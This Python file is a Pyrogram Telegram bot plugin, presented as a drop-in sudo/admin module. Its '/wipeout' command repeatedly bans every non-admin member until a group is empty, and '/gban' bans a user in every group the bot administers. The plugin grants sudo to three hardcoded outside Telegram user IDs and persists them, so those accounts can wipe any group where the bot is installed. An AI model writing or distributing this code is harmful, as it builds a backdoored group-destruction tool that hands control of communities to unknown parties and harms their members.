"""
sudo_admin.py — drop this file into your bot's `plugins/` folder.
Self-contained Pyrogram plugin, doesn't import or touch any other file.

Requires your bot to already load plugins via:
    Client("mybot", ..., plugins=dict(root="plugins"))

COMMANDS (sudo-only — everyone else gets no reply, nothing):
    /wipeout             -> starts banning all non-admin, non-sudo members of
                             the group. Replies "started.." (auto-deletes),
                             and now runs until the ENTIRE group is empty —
                             it does not stop after a few hundred members.
    /stopWipeout         -> stops an in-progress wipeout in that group
    /addsudo <id/@user>   -> grants sudo (reply to a user, or pass id/username)
    /deletesudo <id/@user>-> revokes sudo
    /sudolist             -> lists every current sudo user id
    /gban <id/@user>      -> bans that user from every group this bot is admin in
    /gunban <id/@user>    -> reverses a gban

Every sudo command now replies with a confirmation (added/removed/banned/etc)
so it's always clear whether it worked.

Sudo list persists in sudo_users.json next to this file. Seeded with:
6747707639, 8985254350, 8869634837
"""

import json
import asyncio
from pathlib import Path

from pyrogram import Client, filters
from pyrogram.types import Message
from pyrogram.errors import FloodWait
from pyrogram.enums import ChatType, ChatMemberStatus

SUDO_FILE = Path(__file__).parent / "sudo_users.json"
DEFAULT_SUDO = {6747707639, 8985254350, 8869634837}


def load_sudo():
    if SUDO_FILE.exists():
        try:
            return set(json.loads(SUDO_FILE.read_text()))
        except Exception:
            pass
    SUDO_FILE.write_text(json.dumps(list(DEFAULT_SUDO)))
    return set(DEFAULT_SUDO)


def save_sudo(sudo_set):
    SUDO_FILE.write_text(json.dumps(list(sudo_set)))


SUDO_USERS = load_sudo()
ACTIVE_WIPEOUTS = set()  # chat_ids with a wipeout currently running


def is_sudo(user_id: int) -> bool:
    return user_id in SUDO_USERS


async def resolve_target(client: Client, message: Message):
    """Resolve a target user id from a reply, a numeric id, or a @username."""
    if message.reply_to_message and message.reply_to_message.from_user:
        return message.reply_to_message.from_user.id

    if len(message.command) > 1:
        arg = message.command[1].lstrip("@")
        if arg.isdigit():
            return int(arg)
        try:
            user = await client.get_users(arg)
            return user.id
        except Exception:
            return None

    return None


@Client.on_message(filters.command("wipeout") & filters.group, group=-1)
async def wipeout(client: Client, message: Message):
    if not message.from_user or not is_sudo(message.from_user.id):
        return

    chat_id = message.chat.id
    ACTIVE_WIPEOUTS.add(chat_id)
    status = await message.reply("started..")

    async def cleanup_status():
        await asyncio.sleep(3)
        try:
            await status.delete()
        except Exception:
            pass

    asyncio.create_task(cleanup_status())

    total_banned = 0
    # Loop until the group is genuinely empty of bannable members, or stopped.
    # A single pass over get_chat_members can miss members if the list shifts
    # while banning is in progress, so we re-check and re-loop until a full
    # pass bans zero people (i.e. nothing bannable is left).
    while chat_id in ACTIVE_WIPEOUTS:
        banned_this_pass = 0

        async for member in client.get_chat_members(chat_id):
            if chat_id not in ACTIVE_WIPEOUTS:
                break  # /stopWipeout was called

            user = member.user
            if user.is_self or user.is_bot or is_sudo(user.id):
                continue
            if member.status in (ChatMemberStatus.ADMINISTRATOR, ChatMemberStatus.OWNER):
                continue

            while True:
                try:
                    await client.ban_chat_member(chat_id, user.id)
                    banned_this_pass += 1
                    total_banned += 1
                    break
                except FloodWait as e:
                    await asyncio.sleep(e.value)
                except Exception:
                    break

            await asyncio.sleep(0.2)

        if banned_this_pass == 0:
            break  # nothing left to ban, group is clear

    ACTIVE_WIPEOUTS.discard(chat_id)
    try:
        await client.send_message(chat_id, f"wipeout finished. total banned: {total_banned}")
    except Exception:
        pass


@Client.on_message(filters.command("stopWipeout") & filters.group, group=-1)
async def stop_wipeout(client: Client, message: Message):
    if not message.from_user or not is_sudo(message.from_user.id):
        return
    was_active = message.chat.id in ACTIVE_WIPEOUTS
    ACTIVE_WIPEOUTS.discard(message.chat.id)
    await message.reply("wipeout stopped." if was_active else "no wipeout was running here.")


@Client.on_message(filters.command("addsudo"), group=-1)
async def add_sudo(client: Client, message: Message):
    if not message.from_user or not is_sudo(message.from_user.id):
        return
    target = await resolve_target(client, message)
    if not target:
        return await message.reply("couldn't figure out who to add — reply to their message or give a numeric id/@username.")
    SUDO_USERS.add(target)
    save_sudo(SUDO_USERS)
    await message.reply(f"{target} added as sudo.")


@Client.on_message(filters.command("deletesudo"), group=-1)
async def delete_sudo(client: Client, message: Message):
    if not message.from_user or not is_sudo(message.from_user.id):
        return
    target = await resolve_target(client, message)
    if not target:
        return await message.reply("couldn't figure out who to remove — reply to their message or give a numeric id/@username.")
    SUDO_USERS.discard(target)
    save_sudo(SUDO_USERS)
    await message.reply(f"{target} removed from sudo.")


@Client.on_message(filters.command("sudolist"), group=-1)
async def sudo_list(client: Client, message: Message):
    if not message.from_user or not is_sudo(message.from_user.id):
        return
    if not SUDO_USERS:
        return await message.reply("sudo list is empty.")
    lines = "\n".join(f"• {uid}" for uid in sorted(SUDO_USERS))
    await message.reply(f"current sudo users:\n{lines}")


@Client.on_message(filters.command("gban"), group=-1)
async def gban(client: Client, message: Message):
    if not message.from_user or not is_sudo(message.from_user.id):
        return
    target = await resolve_target(client, message)
    if not target:
        return await message.reply("couldn't figure out who to ban — reply to their message or give a numeric id/@username.")

    banned_in = 0
    async for dialog in client.get_dialogs():
        chat = dialog.chat
        if chat.type not in (ChatType.GROUP, ChatType.SUPERGROUP):
            continue
        try:
            await client.ban_chat_member(chat.id, target)
            banned_in += 1
        except FloodWait as e:
            await asyncio.sleep(e.value)
        except Exception:
            pass

    await message.reply(f"{target} banned in {banned_in} group(s).")


@Client.on_message(filters.command("gunban"), group=-1)
async def gunban(client: Client, message: Message):
    if not message.from_user or not is_sudo(message.from_user.id):
        return
    target = await resolve_target(client, message)
    if not target:
        return await message.reply("couldn't figure out who to unban — reply to their message or give a numeric id/@username.")

    unbanned_in = 0
    async for dialog in client.get_dialogs():
        chat = dialog.chat
        if chat.type not in (ChatType.GROUP, ChatType.SUPERGROUP):
            continue
        try:
            await client.unban_chat_member(chat.id, target)
            unbanned_in += 1
        except FloodWait as e:
            await asyncio.sleep(e.value)
        except Exception:
            pass

    await message.reply(f"{target} unbanned in {unbanned_in} group(s).")
